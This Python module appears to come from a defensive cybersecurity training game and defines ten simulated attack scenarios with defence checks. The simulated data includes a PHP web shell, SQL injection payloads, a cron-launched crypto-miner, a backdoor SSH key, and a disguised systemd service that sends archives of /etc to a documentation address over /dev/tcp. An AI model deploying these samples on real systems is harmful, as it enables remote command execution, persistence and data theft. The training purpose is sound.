"""The ten attack scenarios. Each is a real-world threat the player must shut down.

A Level builds its attack onto the shared server, injects live traffic, and checks
whether the defence conditions are met. Threats are drawn from current issues:
the OWASP Top 10, CISA's most-exploited list and recent high-profile CVEs.
"""
import random

from .world import Flow, Service

ATTACKER_POOL = ["198.51.100.{}", "203.0.113.{}", "185.220.101.{}", "45.153.160.{}",
                 "91.240.118.{}", "194.165.16.{}", "141.98.11.{}"]


def an_ip(rng, idx=0):
    return ATTACKER_POOL[idx % len(ATTACKER_POOL)].format(rng.randint(2, 250))


class Level:
    number = 0
    key = "base"
    port = None               # the port most relevant to the attack
    threat_tags = ()

    def __init__(self, world):
        self.world = world
        self.rng = random.Random((world.rng.random(), self.number).__hash__())
        self.attacker = an_ip(self.rng, self.number)
        self.attacker2 = an_ip(self.rng, self.number + 3)
        self.started = False
        self.solved_at = None
        self.flags = {}
        self.setup()

    # --- hooks overridden by each scenario ---
    def setup(self):
        pass

    def tick(self, dt):
        pass

    def traffic(self, world):
        return []

    def objectives(self):
        """List of (done: bool, text_key) tuples."""
        return []

    def on_kill(self, world, proc):
        pass

    # --- shared helpers ---
    def solved(self):
        return all(done for done, _ in self.objectives())

    def t(self, key, **kw):
        return (key, kw)


# ---------------------------------------------------------------- Level 1: DDoS
class L1_DDoS(Level):
    number = 1
    key = "ddos"
    port = 80
    threat_tags = ("Availability", "DDoS")

    def setup(self):
        w = self.world
        self.bots = [an_ip(self.rng, i) for i in range(6)]
        w.load = 7.5
        w.netload = 0.95
        w.alert("Incoming SYN flood on port 80 - web server unresponsive", "crit")
        for i in range(40):
            bot = self.bots[i % len(self.bots)]
            w.log("/var/log/apache2/access.log",
                  f'{bot} - - [{w.web_stamp(-i)}] "GET /?{self.rng.randint(1000,9999)} HTTP/1.1" 503 0 "-" "bot/1.0"')
        w.log("/var/log/syslog", f"{w.stamp()} {w.fw and 'websrv01'} kernel: [ 9212.3] TCP: too many orphaned sockets")

    def traffic(self, world):
        flows = []
        base = int(world.time * 8)
        for i in range(24):
            bot = self.bots[(base + i) % len(self.bots)]
            flows.append(Flow(bot, 1024 + i, 80, state="SYN_RECV", kind="attack",
                              proc="apache2", flood=True,
                              packet="Flags [S], seq {}, win 512, length 0".format(1000 + i)))
        return flows

    def objectives(self):
        w = self.world
        blocked = not w.reachable(self.bots[0], 80, flood=True)
        # the right fix lets normal browsing continue: don't just stop apache
        http_up = any(p == 80 and svc.running for p, pr, b, svc in w.listening())
        syn = w.sysctl.get("net.ipv4.tcp_syncookies") == "1"
        return [(blocked, "obj.ddos.block"), (syn, "obj.ddos.syn"), (http_up, "obj.ddos.up")]

    def tick(self, dt):
        if self.solved():
            self.world.load = max(0.3, self.world.load - dt * 1.5)
            self.world.netload = max(0.1, self.world.netload - dt * 0.3)


# ---------------------------------------------------------------- Level 2: SQLi
class L2_SQLi(Level):
    number = 2
    key = "sqli"
    port = 3306
    threat_tags = ("OWASP A03", "Injection")

    def setup(self):
        w = self.world
        w.fs.write("/var/www/html/products.php",
                   "<?php\n$id = $_GET['id'];\n// BUG: query built by string concatenation\n"
                   "$q = \"SELECT name,price FROM products WHERE id = $id\";\n"
                   "$r = mysqli_query($db, $q);\n?>\n", owner="www-data")
        w.alert("SQL injection attempts against /products.php - data exfiltration in progress", "crit")
        payloads = ["1 UNION SELECT username,password FROM users-- -", "1 OR 1=1-- -",
                    "1; DROP TABLE users-- -", "1 UNION SELECT table_name,1 FROM information_schema.tables-- -"]
        for i, p in enumerate(payloads):
            enc = p.replace(" ", "%20").replace("'", "%27")
            w.log("/var/log/apache2/access.log",
                  f'{self.attacker} - - [{w.web_stamp(-30 + i)}] "GET /products.php?id={enc} HTTP/1.1" 200 1843 "-" "sqlmap/1.8"')
        w.log("/var/log/mysql/error.log", f"{w.now():%Y-%m-%d} {w.stamp()[-8:]} 12 [Warning] Access via UNION SELECT on users")

    def traffic(self, world):
        return [Flow(self.attacker, 55010, 3306, kind="attack", proc="mysqld", packet="mysql query UNION SELECT"),
                Flow(self.attacker, 55011, 80, kind="attack", proc="apache2",
                     packet="GET /products.php?id=1%20UNION%20SELECT ...")]

    def objectives(self):
        w = self.world
        db_closed = not w.reachable(self.attacker, 3306)   # DB must not face the Internet
        src = w.fs.read("/var/www/html/products.php") if w.fs.exists("/var/www/html/products.php") else ""
        # fix the code: parameterise, or at least cast the id to an int
        patched = "$_GET['id']" not in src or "intval" in src or "(int)" in src or "prepare" in src or "?" in src.split("WHERE")[-1][:40]
        ip_blocked = not w.reachable(self.attacker, 80)
        return [(db_closed, "obj.sqli.db"), (patched, "obj.sqli.code"), (ip_blocked, "obj.sqli.block")]


# ------------------------------------------------------- Level 3: PHP / web shell
class L3_WebShell(Level):
    number = 3
    key = "webshell"
    port = 80
    threat_tags = ("OWASP A03", "RCE")

    def setup(self):
        w = self.world
        shell = ("<?php // uploaded via unrestricted file upload\n"
                 "if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); }\n?>\n")
        w.fs.write("/var/www/html/uploads/avatar.php", shell, owner="www-data", mode=0o644)
        self.proc = w.spawn("www-data", "sh -c id;uname -a  # via avatar.php", cpu=1.2, mem=0.5, tag="webshell")
        w.alert("Web shell detected: /var/www/html/uploads/avatar.php is running commands as www-data", "crit")
        w.log("/var/log/apache2/access.log",
              f'{self.attacker} - - [{w.web_stamp(-12)}] "POST /uploads/avatar.php?cmd=id HTTP/1.1" 200 54 "-" "curl/8.5"')
        w.log("/var/log/apache2/error.log", f"[{w.web_stamp(-12)}] [php] system() called from /uploads/avatar.php")

    def traffic(self, world):
        return [Flow(self.attacker, 55120, 80, kind="attack", proc="apache2",
                     packet="POST /uploads/avatar.php?cmd=whoami")]

    def objectives(self):
        w = self.world
        removed = not w.fs.exists("/var/www/html/uploads/avatar.php")
        proc_dead = self.proc not in w.procs
        # uploads dir should no longer execute php: blocked at fw, or attacker blocked
        ip_blocked = not w.reachable(self.attacker, 80)
        hardened = removed and (not any(p.tag == "webshell" for p in w.procs))
        return [(removed, "obj.webshell.rm"), (proc_dead, "obj.webshell.kill"), (ip_blocked, "obj.webshell.block")]


# --------------------------------------------- Level 4: SSH brute force / botnet
class L4_Brute(Level):
    number = 4
    key = "bruteforce"
    port = 22
    threat_tags = ("Credential access", "Brute force")

    def setup(self):
        w = self.world
        self.bots = [an_ip(self.rng, i + 1) for i in range(4)]
        w.alert("Massive SSH brute-force against root - thousands of failed logins", "crit")
        users = ["root", "admin", "root", "oracle", "root", "postgres"]
        for i in range(60):
            bot = self.bots[i % len(self.bots)]
            w.log("/var/log/auth.log",
                  f"{w.stamp(-120 + i)} websrv01 sshd[{9000+i}]: Failed password for {users[i%len(users)]} from {bot} port {40000+i} ssh2")

    def traffic(self, world):
        flows = []
        for i, bot in enumerate(self.bots):
            flows.append(Flow(bot, 40000 + i, 22, kind="attack", proc="sshd", flood=True,
                              packet="Flags [P.], length 48  SSH-2.0 login attempt"))
        return flows

    def objectives(self):
        w = self.world
        conf = w.read_conf("/etc/ssh/sshd_config", " ")
        # correct defence: stop root password logins AND reload sshd, or firewall SSH off the Internet
        no_root = conf.get("PermitRootLogin", "yes") in ("no", "prohibit-password")
        no_pw = conf.get("PasswordAuthentication", "yes") == "no"
        svc = w.service("ssh")
        applied = svc and svc.running and not svc.needs_restart and svc.loaded.get("PermitRootLogin") in ("no", "prohibit-password")
        fw_blocked = all(not w.reachable(b, 22, flood=True) for b in self.bots)
        hardened = (no_root and applied) or fw_blocked
        return [(no_root, "obj.brute.root"), ((applied or fw_blocked), "obj.brute.apply"), (fw_blocked or no_pw, "obj.brute.block")]


# --------------------------------------------- Level 5: Ransomware / crypto miner
class L5_Ransom(Level):
    number = 5
    key = "ransomware"
    port = None
    threat_tags = ("Malware", "Persistence")

    def setup(self):
        w = self.world
        w.fs.mkdir("/tmp/.kworker", mode=0o755, owner="www-data")
        w.fs.write("/tmp/.kworker/xmrig", "ELF miner binary", mode=0o755)
        w.fs.write("/var/spool/cron/crontabs/www-data",
                   "* * * * * /tmp/.kworker/xmrig --donate 0 -o pool.evil.xmr:4444 >/dev/null 2>&1\n",
                   owner="www-data", mode=0o600)
        self.miner = w.spawn("www-data", "/tmp/.kworker/xmrig -o pool.evil.xmr:4444", cpu=98.0, mem=12.0, tag="miner")
        w.load = 9.8
        w.alert("Crypto-miner 'xmrig' pinning all CPUs - persistence added to cron", "crit")
        w.fs.write("/var/www/html/uploads/NOTE.txt", "Your files will be encrypted unless... (miner dropper)", owner="www-data")

    def traffic(self, world):
        return [Flow("pool.evil.xmr", 4444, 48210, direction="out", kind="attack", proc="xmrig",
                     packet="Flags [P.], Stratum mining.submit")] if world.can_reach_out("45.9.148.7", 4444) else []

    def objectives(self):
        w = self.world
        dead = self.miner not in w.procs
        cron_gone = not w.fs.exists("/var/spool/cron/crontabs/www-data")
        bin_gone = not w.fs.exists("/tmp/.kworker/xmrig")
        return [(dead, "obj.ransom.kill"), (cron_gone, "obj.ransom.cron"), (bin_gone, "obj.ransom.bin")]

    def tick(self, dt):
        if self.miner not in self.world.procs and self.world.fs.exists("/var/spool/cron/crontabs/www-data"):
            # cron re-launches the miner if the job is still there
            if self.world.rng.random() < dt * 0.4:
                self.miner = self.world.spawn("www-data", "/tmp/.kworker/xmrig -o pool.evil.xmr:4444",
                                              cpu=98.0, mem=12.0, tag="miner")
                self.world.alert("cron restarted /tmp/.kworker/xmrig (remove the cron job!)", "crit")
        if self.solved():
            self.world.load = max(0.3, self.world.load - dt * 2.0)


# --------------------------------------------- Level 6: Redis unauth RCE
class L6_Redis(Level):
    number = 6
    key = "redis"
    port = 6379
    threat_tags = ("Misconfiguration", "Exposed service")

    def setup(self):
        w = self.world
        w.alert("Redis is open to the Internet with no password - attacker writing SSH keys", "crit")
        w.log("/var/log/redis/redis-server.log",
              f"1:M {w.now():%d %b %Y} {w.stamp()[-8:]}.100 * CONFIG SET dir /root/.ssh from {self.attacker}")

    def traffic(self, world):
        return [Flow(self.attacker, 55300, 6379, kind="attack", proc="redis-server",
                     packet="CONFIG SET dbfilename authorized_keys")]

    def objectives(self):
        w = self.world
        w.snapshot(w.service("redis"))
        closed = not w.reachable(self.attacker, 6379)
        has_pass = bool(w.redis.get("requirepass"))
        svc = w.service("redis")
        applied = svc and svc.running and not svc.needs_restart
        # acceptable: firewall it off, or bind to localhost + password + restart
        bound_local = w.redis.get("bind", "0.0.0.0").startswith("127.")
        secured = closed or (bound_local and has_pass and applied)
        return [(secured, "obj.redis.closed"), (has_pass or bound_local or closed, "obj.redis.auth"), (applied or closed, "obj.redis.apply")]


# --------------------------------------------- Level 7: CUPS RCE (CVE-2024-47176)
class L7_Cups(Level):
    number = 7
    key = "cups"
    port = 631
    threat_tags = ("CVE-2024-47176", "RCE")

    def setup(self):
        w = self.world
        w.alert("cups-browsed (UDP 631) accepting rogue printers - CVE-2024-47176 exploit inbound", "crit")
        w.printers["EVIL_PRINTER"] = "ipp://198.51.100.9:8631/printers/pwn"
        w.log("/var/log/cups/error_log",
              f"E [{w.web_stamp(-20)}] cups-browsed: added remote printer from {self.attacker} (FoomaticRIPCommandLine)")

    def traffic(self, world):
        flows = []
        if world.reachable(self.attacker, 631, "udp"):
            flows.append(Flow(self.attacker, 55631, 631, proto="udp", kind="attack", proc="cups-browsed",
                              packet="UDP, length 72  IPP Get-Printer-Attributes (rogue)"))
        return flows

    def objectives(self):
        w = self.world
        browsed = w.service("cups-browsed")
        stopped = not (browsed and browsed.running)
        udp_closed = not w.reachable(self.attacker, 631, "udp")
        evil_gone = "EVIL_PRINTER" not in w.printers
        return [((stopped or udp_closed), "obj.cups.stop"), (udp_closed, "obj.cups.block"), (evil_gone, "obj.cups.printer")]


# --------------------------------------------- Level 8: XZ-style supply-chain backdoor
class L8_Backdoor(Level):
    number = 8
    key = "backdoor"
    port = 22
    threat_tags = ("Supply chain", "CVE-2024-3094")

    def setup(self):
        w = self.world
        w.pkg("liblzma5", "5.6.1-1", candidate="5.4.1-1", repo="5.4.1-1",
              desc="XZ-format compression library (COMPROMISED build)")
        w.pkg("xz-utils", "5.6.1-1", candidate="5.4.1-1", repo="5.4.1-1")
        w.service("ssh").loaded["liblzma"] = "5.6.1-1"
        self.bd = w.spawn("root", "sshd: backdoor listener [liblzma]", cpu=0.4, mem=0.8, tag="backdoor")
        w.extra["backdoor_port"] = 22
        w.alert("Compromised liblzma5 5.6.1 (xz backdoor, CVE-2024-3094) linked into sshd", "crit")
        w.log("/var/log/auth.log", f"{w.stamp(-5)} websrv01 sshd[813]: anomalous RSA handshake from {self.attacker} (backdoor trigger)")

    def traffic(self, world):
        if any(p.tag == "backdoor" for p in world.procs) and world.reachable(self.attacker, 22):
            return [Flow(self.attacker, 55800, 22, kind="attack", proc="sshd",
                         packet="Flags [P.], length 88  backdoor magic handshake")]
        return []

    def objectives(self):
        w = self.world
        pkg = w.packages.get("liblzma5", {})
        downgraded = not pkg.get("installed", "").startswith("5.6")
        svc = w.service("ssh")
        reloaded = downgraded and svc and svc.running and svc.loaded.get("liblzma", "").startswith("5.6") is False and not svc.needs_restart
        bd_gone = not any(p.tag == "backdoor" for p in w.procs)
        return [(downgraded, "obj.backdoor.downgrade"), (reloaded, "obj.backdoor.restart"), (bd_gone, "obj.backdoor.proc")]

    def tick(self, dt):
        w = self.world
        svc = w.service("ssh")
        if not w.packages.get("liblzma5", {}).get("installed", "").startswith("5.6") and svc and not svc.needs_restart:
            for p in list(w.procs):
                if p.tag == "backdoor":
                    w.procs.remove(p)


# --------------------------------------------- Level 9: Malicious script / rogue admin
class L9_Script(Level):
    number = 9
    key = "script"
    port = None
    threat_tags = ("Insider", "Living-off-the-land")

    def setup(self):
        w = self.world
        script = ("#!/bin/sh\n# dropped by attacker - exfiltrates /etc and phones home\n"
                  "while true; do\n  tar czf /tmp/.cache.tgz /etc /var/www 2>/dev/null\n"
                  "  cat /tmp/.cache.tgz > /dev/tcp/203.0.113.66/4444\n  sleep 30\ndone\n")
        w.fs.write("/usr/local/bin/update-check", script, mode=0o755)
        w.fs.write("/etc/systemd/system/update-check.service",
                   "[Unit]\nDescription=System Update Check\n[Service]\nExecStart=/usr/local/bin/update-check\n"
                   "Restart=always\n[Install]\nWantedBy=multi-user.target\n")
        svc = Service("update-check", "update-check", [], "/bin/sh /usr/local/bin/update-check", desc="System Update Check (ROGUE)")
        w.services["update-check"] = svc
        self.proc = w.spawn("root", "/bin/sh /usr/local/bin/update-check", cpu=3.0, mem=0.6, tag="svc:update-check")
        svc.pid = self.proc.pid
        w.fs.write("/root/.ssh/authorized_keys",
                   w.fs.read("/root/.ssh/authorized_keys") + "ssh-rsa AAAAB3NzaC1attacker...backdoorkey root@attacker\n")
        w.alert("Rogue service 'update-check' exfiltrating /etc to 203.0.113.66:4444", "crit")

    def traffic(self, world):
        if any(p.tag == "svc:update-check" for p in world.procs) and world.can_reach_out("203.0.113.66", 4444):
            return [Flow("203.0.113.66", 4444, 48900, direction="out", kind="attack", proc="sh",
                         packet="Flags [P.], length 1460  exfil /etc data")]
        return []

    def objectives(self):
        w = self.world
        proc_dead = not any(p.tag == "svc:update-check" for p in w.procs)
        svc = w.service("update-check")
        disabled = not svc or (not svc.enabled and not svc.running)
        file_gone = not w.fs.exists("/usr/local/bin/update-check") or not w.fs.exists("/etc/systemd/system/update-check.service")
        key_clean = "attacker" not in (w.fs.read("/root/.ssh/authorized_keys") if w.fs.exists("/root/.ssh/authorized_keys") else "")
        return [(proc_dead and disabled, "obj.script.stop"), (file_gone, "obj.script.rm"), (key_clean, "obj.script.key")]

    def tick(self, dt):
        w = self.world
        svc = w.service("update-check")
        if svc and svc.enabled and w.fs.exists("/usr/local/bin/update-check") and not any(p.tag == "svc:update-check" for p in w.procs):
            if w.rng.random() < dt * 0.5:
                self.proc = w.spawn("root", "/bin/sh /usr/local/bin/update-check", cpu=3.0, mem=0.6, tag="svc:update-check")
                svc.running = True
                w.alert("systemd Restart=always relaunched update-check (disable + remove it!)", "crit")


# --------------------------------------------- Level 10: Exposed secrets / data breach
class L10_Exfil(Level):
    number = 10
    key = "exfil"
    port = 27017
    threat_tags = ("OWASP A05", "Data breach")

    def setup(self):
        w = self.world
        w.fs.write("/var/www/html/.env",
                   "DB_HOST=127.0.0.1\nDB_USER=admin\nDB_PASSWORD=Sup3rS3cret!\nAWS_SECRET_ACCESS_KEY=AKIA...LEAKED\n",
                   owner="www-data", mode=0o644)
        w.fs.write("/var/www/html/backup.sql", "-- full customer dump\nINSERT INTO users VALUES ('a','4111 1111 1111 1111');\n",
                   owner="www-data", mode=0o644)
        w.alert("Exposed .env and DB backup downloadable from the web; MongoDB open with no auth", "crit")
        w.log("/var/log/apache2/access.log",
              f'{self.attacker} - - [{w.web_stamp(-8)}] "GET /.env HTTP/1.1" 200 142 "-" "python-requests/2.31"')
        w.log("/var/log/apache2/access.log",
              f'{self.attacker} - - [{w.web_stamp(-6)}] "GET /backup.sql HTTP/1.1" 200 9211 "-" "python-requests/2.31"')

    def traffic(self, world):
        return [Flow(self.attacker, 55990, 27017, kind="attack", proc="mongod", packet="MongoDB find() no auth"),
                Flow(self.attacker, 55991, 80, kind="attack", proc="apache2", packet="GET /.env")]

    def objectives(self):
        w = self.world
        env = w.fs.get("/var/www/html/.env")
        env_safe = env is None or (env.mode & 0o004) == 0 or not w.reachable(self.attacker, 80)
        bak = w.fs.get("/var/www/html/backup.sql")
        bak_safe = bak is None or not w.fs.exists("/var/www/html/backup.sql")
        mongo_closed = not w.reachable(self.attacker, 27017)
        return [(env_safe, "obj.exfil.env"), (bak_safe, "obj.exfil.backup"), (mongo_closed, "obj.exfil.mongo")]


ALL_LEVELS = [L1_DDoS, L2_SQLi, L3_WebShell, L4_Brute, L5_Ransom, L6_Redis, L7_Cups, L8_Backdoor, L9_Script, L10_Exfil]


def make_level(world, number):
    cls = ALL_LEVELS[number - 1]
    lvl = cls(world)
    lvl.started = True
    world.level = lvl
    return lvl
